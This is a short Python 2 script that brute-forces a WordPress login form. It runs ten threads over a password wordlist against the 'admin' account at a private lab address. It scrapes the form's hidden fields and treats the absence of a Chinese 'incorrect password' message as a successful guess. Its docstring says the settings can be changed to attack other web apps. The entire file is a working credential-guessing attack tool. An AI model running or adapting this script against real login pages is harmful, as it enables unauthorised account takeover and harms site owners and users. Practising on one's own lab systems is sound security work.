#!/usr/bin/python
#coding=utf-8

import requests
import Queue
import threading
import sys
from pyquery import PyQuery as pq
from dir_bruster import build_wordlist

thread_count = 10
target_url = 'http://192.168.99.196/wordpress/wp-login.php'
target_post = 'http://192.168.99.196/wordpress/wp-login.php'
username_field = 'log'
password_field = 'pwd'
username = 'admin'
wordlist = build_wordlist('./pwd.txt')

class Bruster(object):
'''
    Brute web form using requests and pyquery
    This example is for wordpress, you can change these global params to brute other web app:)
'''
    def __init__(self, username, wordlist):
        self.username = username
        self.wordlist = wordlist
        self.found = False

    def run_brust(self):
        for n in range(thread_count):
            t = threading.Thread(target=self.brust_form)
            t.start()
    
    def brust_form(self):
        while not self.wordlist.empty() and not self.found:
            pwd = self.wordlist.get()
            try:
                s = requests.Session()
                res = s.get(target_url)
                body = self.parse(res.text)
                body[username_field] = self.username
                body[password_field] = pwd

                print('Trying %s:%s (%d left)' % (self.username, pwd, self.wordlist.qsize()))
                result = s.post(target_post, data=body)
                if '密码不正确' not in result.content:
                    self.found = True
                    print('Brute successful by %s:%s' % (self.username, pwd))
            except requests.ConnectionError as e:
                print(e)

    def parse(self, page):
        par = pq(page)
        inputs = par.find('input')
        body = {}
        for n in inputs:
            if n.name is not None:
                body[n.name] = ''
            if n.value is not None:
                body[n.name] = n.value
        return body

b = Bruster(username, wordlist)
b.run_brust()